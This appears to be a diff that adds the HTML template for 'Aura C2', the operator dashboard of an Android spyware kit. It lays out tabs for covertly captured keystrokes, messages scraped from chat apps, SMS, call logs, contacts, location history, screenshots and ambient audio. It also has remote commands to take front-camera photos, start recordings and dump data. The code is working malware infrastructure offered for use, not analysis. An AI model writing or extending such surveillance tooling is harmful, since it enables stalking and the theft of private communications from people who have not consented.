@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ device.model }} — Aura C2</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0a0a0f; --bg2: #12121a; --bg3: #1a1a2e; --surface: #16213e;
+            --border: #252545; --text: #e2e8f0; --text2: #94a3b8; --text3: #64748b;
+            --accent: #6366f1; --accent2: #8b5cf6; --green: #10b981; --red: #ef4444;
+            --orange: #f59e0b; --blue: #3b82f6;
+        }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; display: flex; }
+
+        /* --- SIDEBAR --- */
+        .sidebar {
+            width: 260px; min-height: 100vh; background: var(--bg2);
+            border-right: 1px solid var(--border); display: flex; flex-direction: column;
+            position: fixed; z-index: 10;
+        }
+        .sidebar-header {
+            padding: 20px; border-bottom: 1px solid var(--border);
+        }
+        .sidebar-header a { color: var(--accent); font-size: 13px; text-decoration: none; }
+        .sidebar-header h2 { font-size: 16px; margin-top: 8px; }
+        .sidebar-header .device-meta { font-size: 12px; color: var(--text2); margin-top: 4px; }
+
+        .nav-section { padding: 12px 0; }
+        .nav-section-title { font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text3); padding: 0 20px; margin-bottom: 6px; }
+        .nav-item {
+            display: flex; align-items: center; gap: 10px;
+            padding: 10px 20px; font-size: 13px; color: var(--text2);
+            cursor: pointer; transition: all 0.2s; border-left: 3px solid transparent;
+        }
+        .nav-item:hover { background: rgba(99,102,241,0.08); color: var(--text); }
+        .nav-item.active { background: rgba(99,102,241,0.12); color: var(--accent); border-left-color: var(--accent); }
+        .nav-item i { width: 18px; text-align: center; font-size: 14px; }
+
+        /* --- MAIN CONTENT --- */
+        .main { margin-left: 260px; flex: 1; padding: 24px 32px; }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        .page-title { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
+        .page-subtitle { font-size: 13px; color: var(--text2); margin-bottom: 24px; }
+
+        /* --- DATA TABLE --- */
+        .data-table { width: 100%; border-collapse: collapse; }
+        .data-table th {
+            text-align: left; padding: 10px 14px; font-size: 11px; font-weight: 600;
+            text-transform: uppercase; letter-spacing: 1px; color: var(--text3);
+            border-bottom: 1px solid var(--border); background: var(--bg2);
+            position: sticky; top: 0;
+        }
+        .data-table td {
+            padding: 10px 14px; font-size: 13px; border-bottom: 1px solid rgba(37,37,69,0.5);
+            max-width: 400px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+        }
+        .data-table tr:hover td { background: rgba(99,102,241,0.04); }
+        .data-table .mono { font-family: 'JetBrains Mono', monospace; font-size: 12px; }
+        .data-table .pkg {
+            background: rgba(99,102,241,0.1); color: var(--accent);
+            padding: 2px 8px; border-radius: 4px; font-size: 11px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        /* --- MESSAGE BUBBLES --- */
+        .message-list { display: flex; flex-direction: column; gap: 8px; max-width: 600px; }
+        .message-bubble {
+            padding: 10px 14px; border-radius: 14px; font-size: 13px;
+            max-width: 80%; word-wrap: break-word; position: relative;
+        }
+        .message-bubble.incoming {
+            background: var(--bg3); align-self: flex-start;
+            border-bottom-left-radius: 4px;
+        }
+        .message-bubble.outgoing {
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            align-self: flex-end; border-bottom-right-radius: 4px;
+        }
+        .message-sender { font-size: 11px; font-weight: 600; color: var(--accent); margin-bottom: 4px; }
+        .message-time { font-size: 10px; color: var(--text3); margin-top: 4px; text-align: right; }
+
+        /* --- SCREENSHOT GALLERY --- */
+        .screenshot-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 16px; }
+        .screenshot-card {
+            background: var(--bg2); border: 1px solid var(--border); border-radius: 12px;
+            overflow: hidden; transition: all 0.3s; cursor: pointer;
+        }
+        .screenshot-card:hover { border-color: var(--accent); transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,0,0,0.3); }
+        .screenshot-card img { width: 100%; height: 200px; object-fit: cover; }
+        .screenshot-card .meta { padding: 10px; font-size: 12px; color: var(--text2); }
+
+        /* --- COMMAND PANEL --- */
+        .cmd-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 12px; margin-bottom: 24px; }
+        .cmd-btn {
+            background: var(--bg2); border: 1px solid var(--border); border-radius: 12px;
+            padding: 16px; text-align: center; cursor: pointer; transition: all 0.2s;
+        }
+        .cmd-btn:hover { border-color: var(--accent); background: rgba(99,102,241,0.08); }
+        .cmd-btn i { font-size: 24px; color: var(--accent); display: block; margin-bottom: 8px; }
+        .cmd-btn .label { font-size: 13px; font-weight: 500; }
+        .cmd-btn .desc { font-size: 11px; color: var(--text2); margin-top: 4px; }
+
+        .cmd-log {
+            background: var(--bg2); border: 1px solid var(--border); border-radius: 12px;
+            padding: 16px; max-height: 400px; overflow-y: auto;
+        }
+        .cmd-log-item { padding: 8px 0; border-bottom: 1px solid rgba(37,37,69,0.5); font-size: 13px; }
+        .cmd-log-item .cmd-name { color: var(--accent); font-weight: 600; }
+        .cmd-log-item .cmd-status { font-size: 11px; padding: 2px 8px; border-radius: 4px; }
+        .cmd-log-item .cmd-status.pending { background: rgba(245,158,11,0.15); color: var(--orange); }
+        .cmd-log-item .cmd-status.done { background: rgba(16,185,129,0.15); color: var(--green); }
+
+        /* --- STATUS BAR --- */
+        .status-bar {
+            background: var(--bg2); border: 1px solid var(--border); border-radius: 12px;
+            padding: 16px 20px; margin-bottom: 24px; display: flex; gap: 32px;
+        }
+        .status-item { display: flex; align-items: center; gap: 8px; }
+        .status-item i { color: var(--accent); }
+        .status-item .value { font-weight: 600; }
+        .status-item .label { font-size: 12px; color: var(--text2); }
+
+        /* --- LOADING --- */
+        .loading { text-align: center; padding: 40px; color: var(--text2); }
+        .loading i { font-size: 24px; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 500; }
+        .badge.green { background: rgba(16,185,129,0.15); color: var(--green); }
+        .badge.red { background: rgba(239,68,68,0.15); color: var(--red); }
+        .badge.blue { background: rgba(59,130,246,0.15); color: var(--blue); }
+        .badge.orange { background: rgba(245,158,11,0.15); color: var(--orange); }
+
+        .refresh-btn {
+            position: fixed; bottom: 24px; right: 24px;
+            width: 48px; height: 48px; border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            border: none; color: white; font-size: 18px; cursor: pointer;
+            box-shadow: 0 4px 16px rgba(99,102,241,0.3);
+            transition: transform 0.2s;
+        }
+        .refresh-btn:hover { transform: scale(1.1); }
+    </style>
+</head>
+<body>
+    <!-- SIDEBAR -->
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <a href="/dashboard"><i class="fas fa-arrow-left"></i> All Devices</a>
+            <h2>{{ device.model }}</h2>
+            <div class="device-meta">Android {{ device.android_version }} · {{ device.ip_address }}</div>
+        </div>
+
+        <div class="nav-section">
+            <div class="nav-section-title">Surveillance</div>
+            <div class="nav-item active" data-tab="overview"><i class="fas fa-chart-pie"></i> Overview</div>
+            <div class="nav-item" data-tab="messages"><i class="fab fa-whatsapp"></i> Messages</div>
+            <div class="nav-item" data-tab="keylogs"><i class="fas fa-keyboard"></i> Keylogger</div>
+            <div class="nav-item" data-tab="screen_texts"><i class="fas fa-eye"></i> Screen Scrapes</div>
+            <div class="nav-item" data-tab="notifications"><i class="fas fa-bell"></i> Notifications</div>
+            <div class="nav-item" data-tab="screenshots"><i class="fas fa-camera"></i> Screenshots</div>
+        </div>
+
+        <div class="nav-section">
+            <div class="nav-section-title">Data</div>
+            <div class="nav-item" data-tab="sms"><i class="fas fa-sms"></i> SMS</div>
+            <div class="nav-item" data-tab="call_logs"><i class="fas fa-phone"></i> Call Logs</div>
+            <div class="nav-item" data-tab="contacts"><i class="fas fa-address-book"></i> Contacts</div>
+            <div class="nav-item" data-tab="locations"><i class="fas fa-map-marker-alt"></i> Location</div>
+            <div class="nav-item" data-tab="apps"><i class="fas fa-th-large"></i> Installed Apps</div>
+            <div class="nav-item" data-tab="recordings"><i class="fas fa-microphone"></i> Recordings</div>
+        </div>
+
+        <div class="nav-section">
+            <div class="nav-section-title">Control</div>
+            <div class="nav-item" data-tab="commands"><i class="fas fa-terminal"></i> Remote Commands</div>
+        </div>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div class="main">
+        <!-- OVERVIEW TAB -->
+        <div class="tab-content active" id="tab-overview">
+            <h1 class="page-title">Device Overview</h1>
+            <p class="page-subtitle">{{ device.model }} · Last synced: {{ device.last_seen }}</p>
+            <div class="status-bar">
+                <div class="status-item"><i class="fas fa-mobile-alt"></i><div><div class="value">{{ device.model }}</div><div class="label">Device</div></div></div>
+                <div class="status-item"><i class="fab fa-android"></i><div><div class="value">Android {{ device.android_version }}</div><div class="label">OS</div></div></div>
+                <div class="status-item"><i class="fas fa-globe"></i><div><div class="value">{{ device.ip_address }}</div><div class="label">IP Address</div></div></div>
+                <div class="status-item"><i class="fas fa-clock"></i><div><div class="value">{{ device.last_seen }}</div><div class="label">Last Sync</div></div></div>
+            </div>
+            <div id="overview-stats" style="display:grid; grid-template-columns:repeat(4,1fr); gap:16px;">
+            </div>
+        </div>
+
+        <!-- MESSAGES TAB -->
+        <div class="tab-content" id="tab-messages">
+            <h1 class="page-title"><i class="fab fa-whatsapp" style="color:#25d366"></i> Messages</h1>
+            <p class="page-subtitle">Messages captured from WhatsApp, Instagram, Telegram via screen scraping</p>
+            <div id="messages-data" class="message-list"><div class="loading"><i class="fas fa-spinner"></i> Loading...</div></div>
+        </div>
+
+        <!-- KEYLOGS TAB -->
+        <div class="tab-content" id="tab-keylogs">
+            <h1 class="page-title"><i class="fas fa-keyboard"></i> Keylogger</h1>
+            <p class="page-subtitle">All keystrokes captured across all apps</p>
+            <div id="keylogs-data"><div class="loading"><i class="fas fa-spinner"></i> Loading...</div></div>
+        </div>
+
+        <!-- SCREEN TEXTS TAB -->
+        <div class="tab-content" id="tab-screen_texts">
+            <h1 class="page-title"><i class="fas fa-eye"></i> Screen Text Scrapes</h1>
+            <p class="page-subtitle">Raw text extracted from AccessibilityNodeInfo tree</p>
+            <div id="screen_texts-data"><div class="loading"><i class="fas fa-spinner"></i> Loading...</div></div>
+        </div>
+
+        <!-- NOTIFICATIONS TAB -->
+        <div class="tab-content" id="tab-notifications">
+            <h1 class="page-title"><i class="fas fa-bell"></i> Notifications</h1>
+            <p class="page-subtitle">All captured notifications from device</p>
+            <div id="notifications-data"><div class="loading"><i class="fas fa-spinner"></i> Loading...</div></div>
+        </div>
+
+        <!-- SCREENSHOTS TAB -->
+        <div class="tab-content" id="tab-screenshots">
+            <h1 class="page-title"><i class="fas fa-camera"></i> Screenshots</h1>
+            <p class="page-subtitle">Remote screen captures</p>
+            <div id="screenshots-data" class="screenshot-grid"><div class="loading"><i class="fas fa-spinner"></i> Loading...</div></div>
+        </div>
+
+        <!-- SMS TAB -->
+        <div class="tab-content" id="tab-sms">
+            <h1 class="page-title"><i class="fas fa-sms"></i> SMS Messages</h1>
+            <p class="page-subtitle">All text messages from device</p>
+            <div id="sms-data"><div class="loading"><i class="fas fa-spinner"></i> Loading...</div></div>
+        </div>
+
+        <!-- CALL LOGS TAB -->
+        <div class="tab-content" id="tab-call_logs">
+            <h1 class="page-title"><i class="fas fa-phone"></i> Call Logs</h1>
+            <p class="page-subtitle">Incoming, outgoing, and missed calls</p>
+            <div id="call_logs-data"><div class="loading"><i class="fas fa-spinner"></i> Loading...</div></div>
+        </div>
+
+        <!-- CONTACTS TAB -->
+        <div class="tab-content" id="tab-contacts">
+            <h1 class="page-title"><i class="fas fa-address-book"></i> Contacts</h1>
+            <p class="page-subtitle">Full contact list from device</p>
+            <div id="contacts-data"><div class="loading"><i class="fas fa-spinner"></i> Loading...</div></div>
+        </div>
+
+        <!-- LOCATIONS TAB -->
+        <div class="tab-content" id="tab-locations">
+            <h1 class="page-title"><i class="fas fa-map-marker-alt"></i> Location History</h1>
+            <p class="page-subtitle">GPS coordinates and timestamps</p>
+            <div id="locations-data"><div class="loading"><i class="fas fa-spinner"></i> Loading...</div></div>
+        </div>
+
+        <!-- APPS TAB -->
+        <div class="tab-content" id="tab-apps">
+            <h1 class="page-title"><i class="fas fa-th-large"></i> Installed Apps</h1>
+            <p class="page-subtitle">All applications on device</p>
+            <div id="apps-data"><div class="loading"><i class="fas fa-spinner"></i> Loading...</div></div>
+        </div>
+
+        <!-- RECORDINGS TAB -->
+        <div class="tab-content" id="tab-recordings">
+            <h1 class="page-title"><i class="fas fa-microphone"></i> Audio Recordings</h1>
+            <p class="page-subtitle">Ambient/surround recordings</p>
+            <div id="recordings-data"><div class="loading"><i class="fas fa-spinner"></i> Loading...</div></div>
+        </div>
+
+        <!-- COMMANDS TAB -->
+        <div class="tab-content" id="tab-commands">
+            <h1 class="page-title"><i class="fas fa-terminal"></i> Remote Commands</h1>
+            <p class="page-subtitle">Issue commands to the device — executed on next sync</p>
+
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="sendCommand('screenshot')">
+                    <i class="fas fa-camera"></i>
+                    <div class="label">Screenshot</div>
+                    <div class="desc">Capture screen</div>
+                </div>
+                <div class="cmd-btn" onclick="sendCommand('start_surround')">
+                    <i class="fas fa-microphone"></i>
+                    <div class="label">Start Recording</div>
+                    <div class="desc">Ambient audio</div>
+                </div>
+                <div class="cmd-btn" onclick="sendCommand('stop_surround')">
+                    <i class="fas fa-stop-circle"></i>
+                    <div class="label">Stop Recording</div>
+                    <div class="desc">Stop ambient</div>
+                </div>
+                <div class="cmd-btn" onclick="sendCommand('dump_contacts')">
+                    <i class="fas fa-address-book"></i>
+                    <div class="label">Dump Contacts</div>
+                    <div class="desc">Refresh contacts</div>
+                </div>
+                <div class="cmd-btn" onclick="sendCommand('dump_sms')">
+                    <i class="fas fa-sms"></i>
+                    <div class="label">Dump SMS</div>
+                    <div class="desc">Get all SMS</div>
+                </div>
+                <div class="cmd-btn" onclick="sendCommand('dump_call_logs')">
+                    <i class="fas fa-phone"></i>
+                    <div class="label">Dump Calls</div>
+                    <div class="desc">Get call logs</div>
+                </div>
+                <div class="cmd-btn" onclick="sendCommand('dump_apps')">
+                    <i class="fas fa-th-large"></i>
+                    <div class="label">List Apps</div>
+                    <div class="desc">Installed apps</div>
+                </div>
+                <div class="cmd-btn" onclick="sendCommand('get_location')">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <div class="label">Get Location</div>
+                    <div class="desc">Current GPS</div>
+                </div>
+                <div class="cmd-btn" onclick="sendCommand('take_photo')">
+                    <i class="fas fa-camera-retro"></i>
+                    <div class="label">Take Photo</div>
+                    <div class="desc">Front camera</div>
+                </div>
+                <div class="cmd-btn" onclick="sendCommand('vibrate')">
+                    <i class="fas fa-mobile-alt"></i>
+                    <div class="label">Vibrate</div>
+                    <div class="desc">Test connection</div>
+                </div>
+            </div>
+
+            <h3 style="margin-bottom:12px;">Command History</h3>
+            <div id="commands-data" class="cmd-log"><div class="loading"><i class="fas fa-spinner"></i> Loading...</div></div>
+        </div>
+    </div>
+
+    <button class="refresh-btn" onclick="loadCurrentTab()" title="Refresh"><i class="fas fa-sync-alt"></i></button>
+
+    <script>
+        const DEVICE_ID = '{{ device_id }}';
+        let currentTab = 'overview';
+
+        // Tab navigation
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.addEventListener('click', () => {
+                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+                item.classList.add('active');
+                const tab = item.dataset.tab;
+                document.getElementById('tab-' + tab).classList.add('active');
+                currentTab = tab;
+                loadCurrentTab();
+            });
+        });
+
+        function loadCurrentTab() {
+            if (currentTab === 'overview') return loadOverview();
+            loadData(currentTab);
+        }
+
+        function api(path) {
+            return fetch('/api/dashboard/' + DEVICE_ID + '/' + path).then(r => r.json());
+        }
+
+        function loadOverview() {
+            const types = ['messages', 'keylogs', 'notifications', 'screenshots', 'sms', 'call_logs', 'contacts', 'locations'];
+            const icons = {
+                messages: 'fab fa-whatsapp', keylogs: 'fas fa-keyboard', notifications: 'fas fa-bell',
+                screenshots: 'fas fa-camera', sms: 'fas fa-sms', call_logs: 'fas fa-phone',
+                contacts: 'fas fa-address-book', locations: 'fas fa-map-marker-alt'
+            };
+            const container = document.getElementById('overview-stats');
+            container.innerHTML = '';
+            types.forEach(t => {
+                api(t + '?limit=999').then(data => {
+                    container.innerHTML += `
+                        <div style="background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:20px;text-align:center;">
+                            <i class="${icons[t]}" style="font-size:24px;color:var(--accent);margin-bottom:8px;display:block;"></i>
+                            <div style="font-size:28px;font-weight:700;">${data.length}</div>
+                            <div style="font-size:12px;color:var(--text2);margin-top:4px;">${t.replace('_',' ').replace(/\b\w/g,l=>l.toUpperCase())}</div>
+                        </div>`;
+                });
+            });
+        }
+
+        function loadData(type) {
+            const container = document.getElementById(type + '-data');
+            container.innerHTML = '<div class="loading"><i class="fas fa-spinner"></i> Loading...</div>';
+            api(type).then(data => {
+                if (type === 'messages') renderMessages(data, container);
+                else if (type === 'screenshots') renderScreenshots(data, container);
+                else if (type === 'commands') renderCommands(data, container);
+                else renderTable(data, container, type);
+            });
+        }
+
+        function renderMessages(data, container) {
+            if (!data.length) { container.innerHTML = '<p style="color:var(--text2)">No messages yet. Messages are captured via accessibility screen scraping.</p>'; return; }
+            container.innerHTML = '';
+            data.forEach(m => {
+                const cls = m.is_incoming ? 'incoming' : 'outgoing';
+                container.innerHTML += `
+                    <div class="message-bubble ${cls}">
+                        <div class="message-sender">${m.sender || m.app_package || 'Unknown'}</div>
+                        ${m.text}
+                        <div class="message-time">${m.timestamp || ''}</div>
+                    </div>`;
+            });
+        }
+
+        function renderScreenshots(data, container) {
+            if (!data.length) { container.innerHTML = '<p style="color:var(--text2)">No screenshots yet. Use the Commands tab to capture one.</p>'; return; }
+            container.innerHTML = '';
+            data.forEach(s => {
+                container.innerHTML += `
+                    <div class="screenshot-card" onclick="window.open('/uploads/${DEVICE_ID}/${s.filename}')">
+                        <img src="/uploads/${DEVICE_ID}/${s.filename}" alt="Screenshot" onerror="this.src='data:image/svg+xml,<svg xmlns=\\'http://www.w3.org/2000/svg\\' width=\\'200\\' height=\\'200\\'><rect fill=\\'%231a1a2e\\' width=\\'200\\' height=\\'200\\'/><text x=\\'50%\\' y=\\'50%\\' fill=\\'%2394a3b8\\' text-anchor=\\'middle\\' dy=\\'.3em\\' font-family=\\'Inter\\'>No preview</text></svg>'">
+                        <div class="meta"><i class="fas fa-clock"></i> ${s.timestamp || s.synced_at}</div>
+                    </div>`;
+            });
+        }
+
+        function renderCommands(data, container) {
+            if (!data.length) { container.innerHTML = '<p style="color:var(--text2)">No commands issued yet.</p>'; return; }
+            container.innerHTML = '';
+            data.forEach(c => {
+                const statusCls = c.status === 'done' ? 'done' : 'pending';
+                container.innerHTML += `
+                    <div class="cmd-log-item">
+                        <span class="cmd-name">${c.command}</span>
+                        <span class="cmd-status ${statusCls}">${c.status}</span>
+                        <span style="float:right;font-size:11px;color:var(--text3)">${c.created_at || ''}</span>
+                        ${c.result ? '<div style="font-size:12px;color:var(--text2);margin-top:4px;">'+c.result+'</div>' : ''}
+                    </div>`;
+            });
+        }
+
+        function renderTable(data, container, type) {
+            if (!data.length) { container.innerHTML = '<p style="color:var(--text2)">No data yet.</p>'; return; }
+            const keys = Object.keys(data[0]).filter(k => k !== 'id' && k !== 'device_id');
+            let html = '<table class="data-table"><thead><tr>';
+            keys.forEach(k => html += `<th>${k.replace(/_/g, ' ')}</th>`);
+            html += '</tr></thead><tbody>';
+            data.forEach(row => {
+                html += '<tr>';
+                keys.forEach(k => {
+                    let val = row[k] || '';
+                    if (k === 'app_package' || k === 'package_name') val = `<span class="pkg">${val}</span>`;
+                    else if (k === 'call_type' || k === 'sms_type') val = `<span class="badge blue">${val}</span>`;
+                    html += `<td>${val}</td>`;
+                });
+                html += '</tr>';
+            });
+            html += '</tbody></table>';
+            container.innerHTML = html;
+        }
+
+        function sendCommand(cmd, params) {
+            fetch('/api/dashboard/command', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ device_id: DEVICE_ID, command: cmd, params: params || '' })
+            }).then(r => r.json()).then(d => {
+                if (d.status === 'ok') {
+                    alert('Command queued: ' + cmd + '\nWill execute on next device sync.');
+                    if (currentTab === 'commands') loadData('commands');
+                }
+            });
+        }
+
+        // Auto-load overview on page load
+        loadOverview();
+        // Auto-refresh every 30s
+        setInterval(() => { if (currentTab === 'overview') loadOverview(); else loadData(currentTab); }, 30000);
+    </script>
+</body>
+</html>
